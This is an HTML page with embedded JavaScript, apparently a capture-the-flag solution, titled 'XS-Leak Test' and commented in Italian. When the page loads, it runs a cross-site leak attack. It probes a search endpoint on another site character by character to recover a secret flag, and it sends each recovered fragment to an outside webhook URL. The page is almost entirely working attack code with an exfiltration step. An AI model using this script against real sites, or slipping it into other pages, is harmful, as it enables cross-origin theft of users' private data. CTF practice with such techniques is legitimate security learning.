<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XS-Leak Test</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
        }
        #result {
            margin-top: 20px;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <h1>XS-Leak Test</h1>
    <div id="result">In attesa di risultati...</div>

    <script>
        const validChars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+[]{}|;:,.<>?';
        let currentFlag = 'ability'; // Flag parziale trovata

        // Funzione di delay per inserire un intervallo tra le richieste
        const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

        const leak = async (url) => {
            return new Promise((resolve) => {
                let s = document.createElement('object');
                s.data = url;
                s.onload = () => {
                    s.remove();
                    resolve(true); // Risorsa accessibile (status 200)
                };
                s.onerror = () => {
                    s.remove();
                    resolve(false); // Risorsa non accessibile (status 404 o errore)
                };
                document.body.appendChild(s);
            });
        };

        const logResult = async (message) => {
            const webhookUrl = 'https://webhook.site/d1c2d4d1-02cc-4007-bf6c-1d3cc3528bad';
            try {
                const urlWithParams = `${webhookUrl}?message=${encodeURIComponent(message)}`;
                await fetch(urlWithParams, { method: 'GET' });
            } catch (error) {
                console.error('Errore di rete:', error);
            }
        };

        const guessFlag = async () => {
            for (let i = 0; i < 30; i++) { // Limite massimo di 30 tentativi
                let foundChar = false;

                for (let char of validChars) {
                    const testUrl = `https://matrix.capturetheflags.site/search?s=${currentFlag}${char}`;
                    const result = await leak(testUrl);

                    if (result) { // Se il carattere è corretto
                        currentFlag += char;
                        document.getElementById('result').textContent = `Flag parziale trovata: ${currentFlag}`;
                        await logResult(`Flag parziale trovata: ${currentFlag}`);
                        foundChar = true;
                        break; // Passa al carattere successivo
                    }

                    // Ritardo tra i tentativi
                    await delay(100);
                }

                // Se nessun carattere è valido, interrompe il ciclo
                if (!foundChar) {
                    console.log('Fine della flag raggiunta.');
                    await logResult(`Flag completa trovata: ${currentFlag}`);
                    break;
                }
            }
        };

        // Esegui il test al caricamento del DOM
        document.addEventListener('DOMContentLoaded', () => {
            guessFlag();
        });
    </script>
</body>
</html>
